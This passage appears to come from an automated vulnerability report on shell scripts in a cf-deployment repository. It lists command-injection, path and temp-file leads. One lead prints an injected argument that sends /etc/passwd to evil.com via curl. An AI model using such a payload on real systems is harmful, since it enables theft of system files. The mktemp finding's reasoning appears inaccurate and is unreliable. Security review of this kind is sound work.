It reads input from a file line-by-line and uses that input in shell commands without proper validation or sanitization. For example, the $CF_DEPLOYMENT variable comes from a command line argument and is used directly in a 'cat' command. Similarly, the $RELEASES_ON_LOCAL variable is used to construct file paths without validation.\n\n      An attacker could potentially craft malicious input that gets interpreted as additional shell commands, allowing them to execute arbitrary code or overwrite sensitive files. The script also calls out to wget using input from the file it's reading, which could be abused to download malware or overwrite files.\n\n      To exploit this, an attacker would need the ability to modify the cf-deployment.yml file (or whatever file path is passed as the first argument). Alternatively, if they can control the second argument, they could potentially cause the script to write or download files to arbitrary locations.\n    cwe: CWE-78\n    function_names: []\n    filenames:\n      - iaas-support/alicloud/download-releases.sh\n    classification: very promising\n\n  - headline: Unsafe shell script allowing arbitrary file writes \n    analysis: |\n      The upload-releases.sh script also contains unsafe shell scripting practices. It uses the $RELEASES_ON_LOCAL variable to construct a file path without proper validation. An attacker who can control this variable, passed in as the first argument to the script, can cause the script to upload arbitrary files from anywhere on the filesystem.\n\n      For example, imagine a script that calls upload-releases.sh like this:\n      ```\n      ./upload-releases.sh \"/tmp/releases/; cat /etc/passwd | curl -d @- http://evil.com; echo \"\n      ```\n\n      This would result in the script sending the contents of /etc/passwd to the attacker's server. It could also be abused to overwrite sensitive files owned by the user running the script.\n    cwe: CWE-22\n    function_names: []\n    filenames:\n      - iaas-support/alicloud/upload-releases.sh\n    classification: very promising\n  \n  - headline: Temporary files created with predictable names\n    analysis: |\n      The test-backup-and-restore.sh script creates temporary files using mktemp but without specifying a suffix. The mktemp man page notes that this is dangerous if used in world-writable directories as it allows local users to potentially create symlinks and overwrite arbitrary files. An attacker could exploit this to conduct a denial of service attack or potentially overwrite sensitive files.\n\n      However, exploitability is limited. The script would need to be running as root in a world-writable directory for this to be exploitable. In the context of a CI/CD environment, builds often run in isolated containers where this is unlikely. So while this is a real issue that should be fixed, it has limited exploitability in practice.\n    cwe: CWE-379\n    function_names:\n      - ensure_properties_are_in_sync\n      - check_internal_blobstore_properties\n      - ensure_singleton_blobstore_not_templated\n    filenames:\n      - scripts/test-backup-and-restore.sh\n    classification: not promising\n```",
